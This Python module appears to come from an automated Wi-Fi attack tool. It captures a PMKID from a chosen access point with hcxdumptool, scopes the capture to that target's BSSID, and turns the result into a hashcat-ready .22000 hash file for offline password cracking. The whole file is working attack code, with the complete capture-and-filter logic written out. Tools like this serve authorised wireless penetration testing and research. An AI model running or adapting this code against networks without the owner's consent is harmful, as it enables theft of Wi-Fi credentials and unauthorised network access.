# -*- coding: utf-8 -*-
"""Optional PMKID capture — hcxdumptool → hcxpcapngtool → .22000 hash file.

Secondary attack (behind the PMKID toggle). Structured output: success is the
existence of a non-empty .22000 file, not scraped text.
"""
import os
import re
import subprocess
import time

import config
from attack import tools
from attack.model import AttackEvent, EventType


def _safe(name):
    return re.sub(r"[^A-Za-z0-9_-]", "_", (name or "unknown"))[:24]


def capture(mon, target, req, emit, stop_flag):
    """Try to grab a PMKID for one target. Returns {"ok","hash","essid","bssid"}."""
    bssid = target["bssid"]
    essid = target.get("essid") or bssid
    if not tools.tool_ok(tools.HCXDUMP):
        return {"ok": False, "essid": essid, "bssid": bssid}
    os.makedirs(config.CAPTURE_DIR, exist_ok=True)
    base = os.path.join(config.CAPTURE_DIR, "%s_%s" % (_safe(essid),
                        bssid.replace(":", "")))
    pcapng = base + ".pcapng"
    hashfile = base + ".22000"
    for old in (pcapng, hashfile, base + ".filter"):
        try:
            os.remove(old)
        except OSError:
            pass

    timeout = config.opt_int(req.timing, "WPA Timeout", 300)
    channel = str(target.get("channel") or "")
    filterlist = base + ".filter"
    try:
        with open(filterlist, "w") as f:
            f.write(bssid.replace(":", "").lower() + "\n")
    except OSError:
        filterlist = None
    cmd = [tools.HCXDUMP, "-i", mon, "-w", pcapng, "--enable_status=1"]
    if channel:
        cmd += ["-c", channel]
    if filterlist:
        # filtermode=2: only attack APs in the list, i.e. scope the capture
        # to this target instead of grabbing every PMKID in range.
        cmd += ["--filterlist=%s" % filterlist, "--filtermode=2"]
    emit(AttackEvent(EventType.PHASE, essid=essid, bssid=bssid,
                     phase="PMKID", countdown=timeout, cd_max=timeout))
    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL,
                                stderr=subprocess.DEVNULL)
    except Exception as e:  # noqa: BLE001
        tools.log("hcxdumptool failed: %s" % e)
        return {"ok": False, "essid": essid, "bssid": bssid}

    start = time.time()
    try:
        while (time.time() - start) < timeout:
            if stop_flag and stop_flag.is_set():
                return {"ok": False, "essid": essid, "bssid": bssid,
                        "cancelled": True}
            time.sleep(3)
    finally:
        try:
            proc.terminate()
            proc.wait(timeout=3)
        except Exception:  # noqa: BLE001
            try:
                proc.kill()
            except Exception:  # noqa: BLE001
                pass

    # Convert to a 22000 hash; success = a non-empty hash file that actually
    # names our target's BSSID (hcxdumptool broadcasts, so without this a
    # PMKID from an unrelated nearby AP could be mistaken for a hit).
    if os.path.exists(pcapng) and tools.tool_ok(tools.HCXPCAP):
        tools.run([tools.HCXPCAP, "-o", hashfile, pcapng], timeout=30)
    if os.path.exists(hashfile) and os.path.getsize(hashfile) > 0:
        want = bssid.replace(":", "").lower()
        matched = []
        try:
            with open(hashfile, encoding="utf-8", errors="ignore") as f:
                for line in f:
                    fields = line.strip().split("*")
                    if len(fields) > 3 and fields[3].lower() == want:
                        matched.append(line.strip())
        except OSError:
            matched = []
        if not matched:
            return {"ok": False, "essid": essid, "bssid": bssid}
        with open(hashfile, "w") as f:
            f.write("\n".join(matched) + "\n")
        emit(AttackEvent(EventType.PMKID, essid=essid, bssid=bssid))
        return {"ok": True, "hash": hashfile, "essid": essid, "bssid": bssid}
    return {"ok": False, "essid": essid, "bssid": bssid}
